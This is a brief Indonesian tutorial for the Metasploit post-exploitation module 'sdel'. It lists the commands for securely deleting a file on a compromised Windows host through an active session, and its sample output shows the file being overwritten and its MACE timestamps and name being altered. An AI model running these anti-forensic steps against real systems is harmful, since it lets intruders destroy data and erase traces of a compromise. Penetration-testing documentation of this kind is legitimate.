# sdel

Modul `sdel` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk menghapus file secara aman (secure delete) dari komputer target.

## Cara Penggunaan di Metasploit

```
use post/windows/manage/sdel
set FILE <PATH_FILE>
set ITERATIONS 1
set SESSION <ID>
set ZERO false
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Size of the file: 37
[*] The file is too small. If it's store in the MTF (NTFS) sdel will not overwrite it!
[*] Cluster Size: 4096
[*] Size on disk: 4096
[*] Iteration 1/1:
[*] 4096 bytes overwritten
[*] Changing MACE attributes
[*] Changing file name
[+] File erased!
[*] Post module execution completed
```
